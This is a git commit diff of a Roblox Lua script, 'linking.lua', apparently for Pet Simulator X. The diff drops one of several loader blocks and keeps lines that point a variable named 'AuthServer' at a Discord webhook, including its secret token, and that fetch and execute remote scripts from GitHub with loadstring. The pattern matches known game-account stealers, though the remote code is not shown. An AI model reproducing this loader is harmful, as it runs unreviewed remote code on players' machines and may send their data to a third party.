eb5ceb257e381c041b77cbfad9b6463e4ffb798e
lmaooa1043 <119785971+lmaooa1043@users.noreply.github.com>
2022-12-19 02:28:13 +0300

    Update linking.lua

--- linking.lua
+++ linking.lua
@@ -1,10 +1,3 @@
-_G.UserID = 2478823051
-_G.WebHook = "https://discord.com/api/webhooks/1052244070719815742/bOCQE3l5NUpkAdnWUKxIYeaT6SjXMc5AzDZc5TWD_Re7tZnQXg93fQq7WMxOX4BMM2uO"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
-
 _G.Key = "XXRETOBMlA"
 _G.AuthServer = "https://discord.com/api/webhooks/1052244070719815742/bOCQE3l5NUpkAdnWUKxIYeaT6SjXMc5AzDZc5TWD_Re7tZnQXg93fQq7WMxOX4BMM2uO"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
-
-_G.Key = "XXRETOBMlA"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua"))()
